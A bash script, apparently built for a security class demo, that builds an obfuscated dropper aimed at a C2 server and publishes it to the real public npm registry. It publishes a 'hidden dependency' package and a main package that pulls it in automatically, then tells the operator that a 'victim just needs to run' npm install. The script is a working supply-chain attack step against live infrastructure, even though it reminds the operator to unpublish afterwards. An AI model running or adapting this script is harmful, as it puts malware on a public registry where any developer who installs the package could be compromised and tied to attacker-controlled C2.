#!/usr/bin/env bash
set -e

R='\033[31m' G='\033[32m' Y='\033[33m' C='\033[36m' B='\033[1m' D='\033[2m' X='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

echo ""
echo -e "${R}${B}  ╔═══════════════════════════════════════════════════════════╗${X}"
echo -e "${R}${B}  ║     PUBLISH TO REAL npm — Supply Chain Attack Demo        ║${X}"
echo -e "${R}${B}  ╚═══════════════════════════════════════════════════════════╝${X}"
echo ""

# --- Check npm login ---
NPM_USER=$(npm whoami 2>/dev/null || echo "")
if [ -z "$NPM_USER" ]; then
  echo -e "${R}  [!] You are not logged into npm.${X}"
  echo -e "  ${D}Run: npm login${X}"
  echo ""
  exit 1
fi
echo -e "  ${G}[✓]${X} Logged in as: ${B}${NPM_USER}${X}"
echo ""

FORM_DIR="$SCRIPT_DIR/csec-form-helpers"
CRYPTO_DIR="$SCRIPT_DIR/csec-crypto-utils"

# Package names come from package.json (unscoped: csec-form-helpers, or scoped: @user/csec-form-helpers)
FORM_PKG=$(node -e "console.log(require('$FORM_DIR/package.json').name)")
CRYPTO_PKG=$(node -e "console.log(require('$CRYPTO_DIR/package.json').name)")

SCOPE="@${NPM_USER}"
grep -q "@yourname" "$FORM_DIR/package.json" && NEEDS_PATCH=1 || NEEDS_PATCH=0
grep -q "@yourname" "$CRYPTO_DIR/package.json" && NEEDS_PATCH=1

if [ "$NEEDS_PATCH" = "1" ]; then
  echo -e "  ${Y}[*]${X} Patching @yourname → ${B}${SCOPE}${X}"
  sed -i "s|@yourname/|${SCOPE}/|g" "$FORM_DIR/package.json"
  sed -i "s|@yourname/|${SCOPE}/|g" "$CRYPTO_DIR/package.json"
  sed -i "s|@yourname/|${SCOPE}/|g" "$CRYPTO_DIR/package.md"
  FORM_PKG=$(node -e "console.log(require('$FORM_DIR/package.json').name)")
  CRYPTO_PKG=$(node -e "console.log(require('$CRYPTO_DIR/package.json').name)")
  echo -e "  ${G}[✓]${X} Patched package names"
  echo ""
fi

if [[ "$FORM_PKG" == @* ]]; then
  NPM_ACCESS=(--access public)
  echo -e "  ${D}Scoped packages — publishing with --access public${X}"
else
  NPM_ACCESS=()
  echo -e "  ${D}Unscoped names — global registry (name must not be taken)${X}"
fi
echo ""

# --- Get C2 target ---
C2_TARGET="${1}"

if [ -z "$C2_TARGET" ]; then
  echo -e "  ${Y}[?]${X} Where is your C2 server running?"
  echo ""
  echo -e "  ${D}  Render:  ./publish.sh https://csec-c2.onrender.com${X}"
  echo -e "  ${D}  Local:   ./publish.sh 192.168.1.50 4444${X}"
  echo ""
  echo -e "  ${D}  Auto-detecting local IP...${X}"
  for cmd in "ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[\d.]+'" \
             "hostname -I 2>/dev/null | awk '{print \$1}'" \
             "ifconfig 2>/dev/null | grep 'inet ' | grep -v 127.0.0.1 | head -1 | awk '{print \$2}'" \
             "ipconfig getifaddr en0 2>/dev/null"; do
    C2_TARGET=$(eval "$cmd" 2>/dev/null) && [ -n "$C2_TARGET" ] && break
  done

  if [ -z "$C2_TARGET" ]; then
    echo -e "${R}  [!] Could not detect your IP.${X}"
    echo -e "  ${D}Usage: ./publish.sh <C2_URL_OR_IP> [PORT]${X}"
    exit 1
  fi
fi

if echo "$C2_TARGET" | grep -qE '^https?://'; then
  echo -e "  ${C}${B}C2 target:${X} ${C2_TARGET} (remote)"
else
  C2_PORT="${2:-4444}"
  echo -e "  ${C}${B}C2 target:${X} ${C2_TARGET}:${C2_PORT} (local)"
fi
echo ""

# --- Build obfuscated dropper ---
echo -e "${Y}${B}  ── Step 1: Building obfuscated dropper ──${X}"
if [ -n "$C2_PORT" ]; then
  node "$SCRIPT_DIR/build-obfuscated.js" "$C2_TARGET" "$C2_PORT"
else
  node "$SCRIPT_DIR/build-obfuscated.js" "$C2_TARGET"
fi

PUBLISH_FAILED=0

# --- Publish hidden dependency first ---
echo -e "${Y}${B}  ── Step 2: Publishing ${CRYPTO_PKG} (hidden dependency) ──${X}"
cd "$CRYPTO_DIR"
set +e
npm publish "${NPM_ACCESS[@]}" 2>&1
EC_CRYPTO=$?
set -e
CRYPTO_VER=$(node -e "console.log(require('$CRYPTO_DIR/package.json').version)")
if [ "$EC_CRYPTO" -eq 0 ]; then
  echo -e "  ${G}[✓]${X} Published ${CRYPTO_PKG}@${CRYPTO_VER}"
else
  echo -e "  ${R}[✗]${X} npm publish failed (exit $EC_CRYPTO)"
  PUBLISH_FAILED=1
fi
echo ""

# --- Publish main package ---
echo -e "${Y}${B}  ── Step 3: Publishing ${FORM_PKG} (main package) ──${X}"
cd "$FORM_DIR"
set +e
npm publish "${NPM_ACCESS[@]}" 2>&1
EC_FORM=$?
set -e
FORM_VER=$(node -e "console.log(require('$FORM_DIR/package.json').version)")
if [ "$EC_FORM" -eq 0 ]; then
  echo -e "  ${G}[✓]${X} Published ${FORM_PKG}@${FORM_VER}"
else
  echo -e "  ${R}[✗]${X} npm publish failed (exit $EC_FORM)"
  PUBLISH_FAILED=1
fi
echo ""

if [ "$PUBLISH_FAILED" -ne 0 ]; then
  echo -e "${R}${B}  ╔═══════════════════════════════════════════════════════════╗${X}"
  echo -e "${R}${B}  ║              PUBLISH FAILED — NOT ON npm                  ║${X}"
  echo -e "${R}${B}  ╚═══════════════════════════════════════════════════════════╝${X}"
  echo ""
  echo -e "  ${Y}Common fix (E403):${X} npm requires **2FA** or a **granular access token**"
  echo -e "  with permission to publish. On npmjs.com:"
  echo -e "    ${D}Profile → Access Tokens → Generate New Token → Granular Access${X}"
  echo -e "    ${D}Enable “Publish”, then:${X} ${C}npm login --auth-type=legacy${X} (or set token in ~/.npmrc)"
  echo -e "  Or enable 2FA on your account and use ${C}npm publish${X} again (OTP when prompted)."
  echo ""
  exit 1
fi

# --- Done ---
echo -e "${G}${B}  ╔═══════════════════════════════════════════════════════════╗${X}"
echo -e "${G}${B}  ║                  PACKAGES PUBLISHED                       ║${X}"
echo -e "${G}${B}  ╚═══════════════════════════════════════════════════════════╝${X}"
echo ""
echo -e "  ${C}${B}Main package:${X}     npm install ${FORM_PKG}"
echo -e "  ${C}${B}Hidden dep:${X}       ${CRYPTO_PKG}@${CRYPTO_VER} (pulled automatically)"
echo -e "  ${C}${B}C2 target:${X}        ${C2_TARGET}"
echo ""
echo -e "  ${Y}${B}── Victim just needs to run: ──${X}"
echo -e "  npm install ${FORM_PKG}"
echo ""
if echo "$C2_TARGET" | grep -qE '^https?://'; then
  echo -e "  ${D}C2 dashboard: ${C2_TARGET}${X}"
  echo -e "  ${D}(Make sure your Render service is deployed and running)${X}"
else
  echo -e "  ${D}Don't forget to start the C2 server:${X}"
  echo -e "  ${D}cd ../c2-server && node server.js${X}"
fi
echo ""
if [ -n "$C2_SECRET" ]; then
  echo -e "  ${G}[+] Token auth:${X} C2_SECRET is set — only your payload can POST"
else
  echo -e "  ${Y}[!] No token:${X} set ${C}C2_SECRET${X} env var to block spam on the C2"
fi
echo ""
echo -e "  ${R}After the session, run: ./unpublish.sh${X}"
echo ""
